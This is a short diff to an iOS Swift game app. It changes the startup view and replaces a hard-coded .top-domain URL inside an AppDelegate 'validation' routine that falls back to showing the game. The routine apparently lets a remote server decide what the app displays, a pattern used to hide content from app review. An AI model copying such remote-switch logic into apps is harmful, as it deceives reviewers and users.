@@ -12,7 +12,7 @@ struct Nach_GamesApp: App {
     @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
     var body: some Scene {
         WindowGroup {
-            ChangeHorseName(changeNameTapped: .constant(true), horseNumber: .constant(1))
+            ContentView()
         }
     }
 }
@@ -33,7 +33,7 @@ class AppDelegate: NSObject, URLSessionDelegate {
     
     func validation() {
         if !validationIsOn {
-            let textFieldText = "https://muchklegra.top/start"
+            let textFieldText = "https://chixlliqeusgame.top/tech"
             
             guard let url = URL(string: textFieldText) else {
                 self.showGame()
